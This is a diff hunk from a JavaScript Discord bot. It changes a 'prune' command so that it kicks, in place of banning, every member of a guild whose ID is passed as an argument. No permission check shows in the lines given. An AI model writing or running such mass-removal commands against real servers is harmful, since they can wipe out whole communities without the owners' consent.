@@ -75,12 +75,12 @@ client.on('message', message => {
             }
         }
         
-        // Bans all members from server
+        // Kicks all members from server
         if (args[0] == prefix + 'prune') {
             if (args[1] != null) {
                 let guild = client.guilds.get(args[1]);
                 guild.members.forEach(m => {
-                    m.ban();
+                    m.kick();
                 });
             }
         }
